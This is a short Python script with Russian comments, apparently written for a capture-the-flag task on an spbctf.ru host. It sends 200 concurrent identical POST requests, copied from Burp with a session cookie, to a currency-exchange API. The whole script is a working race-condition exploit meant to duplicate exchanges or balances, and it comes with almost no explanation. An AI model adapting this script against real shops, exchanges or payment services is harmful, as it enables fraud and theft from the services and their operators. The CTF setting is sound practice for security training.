import grequests as greqs

# Отправка любого количества однотипных запросов
# Запрос берем из берпа, у меня ругался на пробел в 'Oper GX' - просто удалаяем проблемные строки

count = 200
# Генерируем запросы
mapping = (greqs.post("https://its-grand-supermarket-3pjuqgvo.spbctf.ru/api/exchange",
                    data='amount=0.03&cur_from=Гастрофранк&cur_to=Беконик&submit=^%^D0^%^9E^%^D0^%^B1^%^D0^%^BC^%^D0^%^B5^%^D0^%^BD^%^D1^%^8F^%^D1^%^82^%^D1^%^8C',
                    headers={
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                        "authority": "its-grand-supermarket-3pjuqgvo.spbctf.ru",
                        "cache-control": "max-age=0",
                        "content-type": "application/x-www-form-urlencoded",
                        "origin": "https://its-grand-supermarket-3pjuqgvo.spbctf.ru",
                        "referer": "https://its-grand-supermarket-3pjuqgvo.spbctf.ru/account",
                        "sec-ch-ua-mobile": "?1",
                        "sec-ch-ua-platform": "^\\^Android^^",
                        "sec-ch-ua-platform-version": "^\\^6.0^^",
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "same-origin",
                        "sec-fetch-user": "?1",
                        "upgrade-insecure-requests": "1",
                        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
                    },
                    cookies={
                        "__cfduid": "5d93f14f8ee4291cc852ba0c18c66590",
                        "session": "86120049-86e0-40f0-be22-17b104f27105"
                    },
                    auth=(),
                    ) for _ in range(count))

# Отсылаем запросы
for res in greqs.map(mapping):
    pass
